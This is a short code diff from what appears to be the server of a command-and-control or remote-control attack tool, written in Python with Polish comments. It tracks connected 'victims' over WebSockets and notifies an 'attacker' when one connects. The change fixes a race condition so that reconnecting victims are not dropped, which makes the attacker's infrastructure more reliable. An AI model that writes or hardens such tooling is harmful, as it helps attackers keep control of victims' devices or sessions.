@@ -136,15 +136,15 @@ async def victim_endpoint(ws: WebSocket, victim_id_query: str | None = Query(def
 
     victim_id = victim_id_query or f"victim-{id(ws)}"
 
-    # Jeśli victim o tym samym ID już istnieje — zamknij starą sesję
-    if victim_id in victims:
-        old_ws = victims[victim_id]
+    # Jeśli victim o tym samym ID już istnieje — najpierw nadpisz, potem zamknij starą
+    old_ws = victims.get(victim_id)
+    victims[victim_id] = ws  # NAJPIERW nadpisz — żeby stary finally nie usunął nowego
+
+    if old_ws is not None:
         try:
             await old_ws.close()
         except Exception:
             pass
-
-    victims[victim_id] = ws
     print(f"[+] Victim połączony: {victim_id} (aktywnych: {len(victims)})")
 
     await notify_attacker({"type": "victim_connected", "id": victim_id})
